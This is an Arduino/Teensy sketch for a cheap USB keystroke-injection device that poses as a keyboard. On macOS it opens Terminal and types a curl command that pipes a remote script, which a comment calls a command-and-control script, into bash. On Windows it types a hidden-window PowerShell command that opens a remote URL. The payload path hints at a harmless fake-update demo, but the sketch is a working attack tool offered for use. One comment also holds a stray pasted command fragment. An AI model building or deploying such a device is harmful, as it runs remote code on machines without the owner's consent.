/*
 * $10 USB HID takover device alternative
 * Tested so far only on Mac with US keyboard and Czech driver (unusual combination).
 * Should work on US/US without issues.
 */

#include <Keyboard.h>

/*
 * HID SKETCHPAD (keep cursor here to stay on the safer side - well, not really)
 * 
 */

// Teensy 2.0 has the LED on pin 11
// Teensy++ 2.0 has the LED on pin 6
// Teensy 3.0 has the LED on pin 13
const int ledPin = 6;

void setup() {
  Serial.begin(9600);
  pinMode(ledPin, OUTPUT);
  blink();
}

// Choose your target first:
#define MACOSX
//#define WINDOWS

#ifdef MACOSX
String SHELL_SCRIPT1 = "curl -s https://raw.githubusercontent.com/corpus-solutions/sec-takover-examples/master/safe/mac/fake_update.sh ";
String SHELL_SCRIPT2 = " bash\n";
#endif

#ifdef WINDOWS
String SHELL_SCRIPT1 = "powershell -windowstyle hidden (new-object -com wscript.shell).run('http://fakeupdate.net/win10u/',3)";
#endif

void loop() {
  
  // Your computer will receive these characters from a USB keyboard.
  doMac();
  doWindows();

  // stop forever (TODO: blink Teensy LED)
  while (true) {    
    blink();
    delay(60000);
  }
}

void blink() {
  digitalWrite(ledPin, HIGH);   // set the LED on
  delay(300);                  // wait for a second
  digitalWrite(ledPin, LOW);    // set the LED off
  delay(100);
}

/*
 * Mac OS X
 */

void doMac()
{
#ifdef MACOSX

  blink(); blink(); blink();

  pressAndReleaseAppleSpace(); 
  delay(1000); 
  
  Keyboard.print("Term");   
  delay(500);
  
  Keyboard.print("\n"); 
  delay(100);

  blink();

  // Pull command-and-control script
  Keyboard.print(SHELL_SCRIPT1);

  // Pipe (platform specific)
  pressAndReleasePipe();

  // ..to bash. Enter.
  Keyboard.println(SHELL_SCRIPT2);
#endif
}

void pressAndReleaseAppleSpace()
{
  // Press Apple (Windows) Key
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void pressAndReleaseAppleT()
{
  // Press Apple (Windows) Key
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void pressAndReleasePipe()
{
  // Press Apple (Windows) Keyhell -windowstyle hidden (new-object -com wscript.shell).run(`http://fakeupdate.net/win10u/`,3)
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_TILDE);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

/*
 * Windows
 */
 
void doWindows()
{
#ifdef WINDOWS

  blink(); blink(); 
  
  pressAndReleaseWindowsR();
  delay(1000);
  Keyboard.print(SHELL_SCRIPT1);
#endif
}

void pressAndReleaseWindowsR()
{
  // Press Apple (Windows) Key
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
